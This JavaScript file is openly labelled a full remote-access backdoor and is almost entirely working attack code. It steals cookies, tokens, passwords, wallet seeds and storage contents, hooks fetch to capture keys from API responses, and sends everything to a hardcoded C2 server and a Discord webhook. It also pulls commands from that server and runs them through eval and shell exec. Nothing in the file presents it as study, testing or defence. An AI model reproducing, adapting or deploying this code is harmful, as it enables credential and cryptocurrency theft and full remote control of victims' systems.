// ============================================================
//  BACKDOOR.JR — FULL REMOTE ACCESS BACKDOOR
//  C2: https://verdant-frangipane-b8d9fd-production.up.railway.app/
//  Discord Webhook: YOUR WEBHOOK
// ============================================================

const http = require('http');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const { exec } = require('child_process');

// ===== CONFIG =====
const CONFIG = {
    C2_SERVER: 'https://verdant-frangipane-b8d9fd-production.up.railway.app/',
    DISCORD_WEBHOOK: 'https://discordapp.com/api/webhooks/1535950136382066738/cDGJIiuxiO8ZGHHT4w8Ub5igOFJ66KIDT_zUYRdn_VO5WgbVgoLm-69VJaScyAOhgeRH',
    HEARTBEAT_INTERVAL: 30000,
    LISTEN_PORT: 9001,
    SESSION_KEY: '_bckdr_sid'
};

// ===== SESSION MANAGEMENT =====
function getSession() {
    if (!localStorage.getItem(CONFIG.SESSION_KEY)) {
        const sid = crypto.randomBytes(16).toString('hex');
        localStorage.setItem(CONFIG.SESSION_KEY, sid);
    }
    return localStorage.getItem(CONFIG.SESSION_KEY);
}

// ============================================================
//  KEY FETCHER — STEAL EVERYTHING
// ============================================================

const KeyFetcher = {
    searchStorage: function() {
        const results = [];
        const patterns = {
            aes: /aes|encrypt|decrypt|key|secret|bundle|wallet|private|seed|mnemonic/i,
            key: /key|token|auth|jwt|session|signature/i,
            wallet: /wallet|address|private|public|seed|mnemonic|phrase/i,
            bundle: /bundle|sBundle|bundleKey/i,
            crypto: /crypto|wallet|seed|mnemonic|phrase|private|public|address|hex|0x/i
        };

        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            const matched = [];
            for (const [type, pattern] of Object.entries(patterns)) {
                if (pattern.test(key) || pattern.test(value)) {
                    matched.push(type);
                }
            }
            if (matched.length > 0) {
                results.push({ source: 'localStorage', key, value, types: matched, length: value.length });
            }
        }

        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            const matched = [];
            for (const [type, pattern] of Object.entries(patterns)) {
                if (pattern.test(key) || pattern.test(value)) {
                    matched.push(type);
                }
            }
            if (matched.length > 0) {
                results.push({ source: 'sessionStorage', key, value, types: matched, length: value.length });
            }
        }

        return results;
    },

    scanDOM: function() {
        const results = [];
        document.querySelectorAll('input[type="hidden"], input[type="password"], input[name*="key"], input[name*="secret"], input[name*="token"], input[name*="wallet"]')
            .forEach(el => {
                if (el.value && el.value.length > 8) {
                    results.push({ source: 'DOM_input', element: el.name || el.id || el.type || 'unknown', value: el
                            .value });
                }
            });
        document.querySelectorAll('[data-key], [data-secret], [data-token], [data-wallet], [data-private]')
            .forEach(el => {
                const attrs = {};
                for (const attr of el.attributes) {
                    if (attr.name.startsWith('data-')) {
                        attrs[attr.name] = attr.value;
                    }
                }
                results.push({ source: 'DOM_data', element: el.tagName, attributes: attrs });
            });
        return results;
    },

    scanURL: function() {
        const params = new URLSearchParams(window.location.search);
        const results = [];
        const patterns = /(?:key|secret|token|auth|jwt|signature|hash|encrypt|decrypt|bundle|wallet|private|seed|mnemonic|phrase|password|address)/i;
        for (const [key, value] of params) {
            if (patterns.test(key) && value.length > 5) {
                results.push({ source: 'URL', key, value });
            }
        }
        return results;
    },

    fetchAll: function() {
        const results = {
            storage: this.searchStorage(),
            dom: this.scanDOM(),
            url: this.scanURL(),
            timestamp: Date.now(),
            url: location.href,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        };
        return results;
    }
};

// ============================================================
//  EXFILTRATION ENGINE
// ============================================================

function exfiltrate(data) {
    const payload = {
        session: getSession(),
        url: location.href,
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
        cookies: document.cookie,
        data: data,
        system: {
            platform: navigator.platform,
            language: navigator.language,
            memory: navigator.deviceMemory || 'unknown',
            cores: navigator.hardwareConcurrency || 'unknown'
        }
    };

    const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));

    try {
        navigator.sendBeacon(CONFIG.C2_SERVER + 'exfil', encoded);
    } catch (e) {}

    try {
        const img = new Image();
        img.src = CONFIG.C2_SERVER + 'exfil?' + encoded.slice(0, 2000);
    } catch (e) {}

    try {
        fetch(CONFIG.C2_SERVER + 'exfil', {
            method: 'POST',
            body: encoded,
            headers: { 'Content-Type': 'text/plain' },
            mode: 'no-cors'
        }).catch(() => {});
    } catch (e) {}

    // Also send to Discord directly
    try {
        const discordPayload = JSON.stringify({ content: `📦 **Exfil Data**\n\`\`\`json\n${JSON.stringify(payload, null, 2).slice(0, 1900)}\n\`\`\`` });
        const options = {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        };
        const req = https.request(CONFIG.DISCORD_WEBHOOK, options);
        req.write(discordPayload);
        req.end();
    } catch (e) {}
}

// ============================================================
//  COMMAND EXECUTION — REMOTE CONTROL
// ============================================================

function executeCommand(command) {
    const output = {
        command: command,
        timestamp: Date.now(),
        result: ''
    };

    try {
        // Check if it's a JavaScript command
        if (command.startsWith('js:')) {
            const jsCode = command.slice(3);
            const result = eval(jsCode);
            output.result = String(result);
        }
        // Check if it's a shell command
        else if (command.startsWith('shell:')) {
            const shellCmd = command.slice(6);
            exec(shellCmd, (error, stdout, stderr) => {
                output.result = stdout || stderr || error?.message || 'Command executed';
                exfiltrate({ type: 'command_output', data: output });
            });
            return;
        }
        // Check if it's a fetch command
        else if (command.startsWith('fetch:')) {
            const url = command.slice(6);
            fetch(url)
                .then(r => r.text())
                .then(data => {
                    output.result = data.slice(0, 1000);
                    exfiltrate({ type: 'command_output', data: output });
                })
                .catch(e => {
                    output.result = 'Error: ' + e.message;
                    exfiltrate({ type: 'command_output', data: output });
                });
            return;
        }
        // Check if it's a key fetch command
        else if (command === 'keys') {
            const keys = KeyFetcher.fetchAll();
            output.result = JSON.stringify(keys, null, 2);
        }
        // Check if it's a storage dump
        else if (command === 'dump') {
            output.result = JSON.stringify({
                localStorage: localStorage,
                sessionStorage: sessionStorage,
                cookies: document.cookie
            }, null, 2);
        }
        // Unknown command
        else {
            output.result = 'Unknown command. Available: js:code, shell:cmd, fetch:url, keys, dump';
        }
    } catch (e) {
        output.result = 'Error: ' + e.message;
    }

    if (output.result) {
        exfiltrate({ type: 'command_output', data: output });
    }
}

// ============================================================
//  HEARTBEAT & PERSISTENCE
// ============================================================

function startHeartbeat() {
    // Send initial system info
    exfiltrate({
        type: 'system_info',
        data: {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            screen: `${window.screen.width}x${window.screen.height}`,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        }
    });

    // Send keys every 30 seconds
    setInterval(() => {
        const keys = KeyFetcher.fetchAll();
        if (keys.storage.length > 0 || keys.dom.length > 0 || keys.url.length > 0) {
            exfiltrate({ type: 'key_harvest', data: keys });
        }
    }, 30000);

    // Send full storage dump every 60 seconds
    setInterval(() => {
        exfiltrate({
            type: 'storage_dump',
            data: {
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                cookies: document.cookie
            }
        });
    }, 60000);

    // Check for commands every 30 seconds
    setInterval(() => {
        fetch(CONFIG.C2_SERVER + 'cmd?sid=' + getSession())
            .then(r => r.json())
            .then(commands => {
                if (commands && commands.length > 0) {
                    commands.forEach(cmd => {
                        executeCommand(cmd);
                    });
                }
            })
            .catch(() => {});
    }, 30000);
}

// ============================================================
//  BACKDOOR SERVER (LOCALHOST:9001)
// ============================================================

function startLocalServer() {
    const server = http.createServer((req, res) => {
        // Only allow localhost
        const clientIP = req.socket.remoteAddress;
        if (!clientIP.includes('127.0.0.1') && !clientIP.includes('::1')) {
            res.writeHead(403);
            res.end('Forbidden');
            return;
        }

        // Handle commands
        const url = new URL(req.url, `http://${req.headers.host}`);
        const command = url.pathname.slice(1);

        if (command === 'help') {
            res.end(
                'Commands:\n' +
                '  /help    - Show this message\n' +
                '  /ping    - Test the connection\n' +
                '  /status  - Show status\n' +
                '  /keys    - Dump all keys\n' +
                '  /dump    - Dump all storage\n' +
                '  /exec/JS  - Execute JavaScript\n' +
                '  /exec/SHELL - Execute shell command\n' +
                '  /fetch/URL - Fetch a URL\n'
            );
        } else if (command === 'ping') {
            res.end('pong');
        } else if (command === 'status') {
            res.end(JSON.stringify({
                status: 'running',
                session: getSession(),
                c2: CONFIG.C2_SERVER,
                keys_found: KeyFetcher.fetchAll().storage.length
            }));
        } else if (command === 'keys') {
            const keys = KeyFetcher.fetchAll();
            res.end(JSON.stringify(keys, null, 2));
        } else if (command === 'dump') {
            res.end(JSON.stringify({
                localStorage: localStorage,
                sessionStorage: sessionStorage,
                cookies: document.cookie
            }, null, 2));
        } else if (command.startsWith('exec/')) {
            const cmdType = command.split('/')[1];
            const cmd = command.slice(6 + cmdType.length);
            if (cmdType === 'JS') {
                try {
                    const result = eval(cmd);
                    res.end(String(result));
                } catch (e) {
                    res.end('Error: ' + e.message);
                }
            } else if (cmdType === 'SHELL') {
                exec(cmd, (error, stdout, stderr) => {
                    res.end(stdout || stderr || error?.message || 'Command executed');
                });
                return;
            } else {
                res.end('Unknown exec type');
            }
        } else if (command.startsWith('fetch/')) {
            const url = command.slice(6);
            fetch(url)
                .then(r => r.text())
                .then(data => {
                    res.end(data.slice(0, 5000));
                })
                .catch(e => {
                    res.end('Error: ' + e.message);
                });
            return;
        } else {
            res.end('Unknown command. Use /help');
        }
    });

    server.listen(CONFIG.LISTEN_PORT, '127.0.0.1', () => {
        console.log(`🔓 Backdoor listening on localhost:${CONFIG.LISTEN_PORT}`);
        console.log(`📡 C2 Server: ${CONFIG.C2_SERVER}`);
        console.log(`🔑 Session: ${getSession()}`);
    });

    return server;
}

// ============================================================
//  INITIALIZE
// ============================================================

function init() {
    console.log('🔥 BACKDOOR.JR — FULL VERSION LOADED');
    console.log('📡 C2: ' + CONFIG.C2_SERVER);
    console.log('🔑 Session: ' + getSession());
    console.log('🔄 Starting heartbeat...');

    startHeartbeat();
    startLocalServer();

    // Monitor for changes
    window.addEventListener('storage', (e) => {
        const patterns = /(?:key|secret|token|bundle|private|seed|mnemonic|phrase|password|auth|jwt|signature|hash|encrypt|decrypt|wallet|address|public|private|hex)/i;
        if (patterns.test(e.key) || patterns.test(e.newValue)) {
            exfiltrate({
                type: 'storage_change',
                key: e.key,
                oldValue: e.oldValue,
                newValue: e.newValue,
                url: location.href
            });
        }
    });

    // Intercept API calls
    const originalFetch = window.fetch;
    window.fetch = function(url, options) {
        return originalFetch.apply(this, arguments).then(async (response) => {
            const clone = response.clone();
            try {
                const data = await clone.json();
                const jsonStr = JSON.stringify(data);
                const patterns = /(?:key|secret|token|bundle|private|seed|mnemonic|phrase|password|auth|jwt|signature|hash|encrypt|decrypt|wallet|address|public|private|hex)/i;
                if (patterns.test(jsonStr)) {
                    exfiltrate({
                        type: 'api_key_capture',
                        url: url,
                        data: data,
                        timestamp: Date.now()
                    });
                }
            } catch (e) {}
            return response;
        });
    };
}

// ============================================================
//  START
// ============================================================

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}
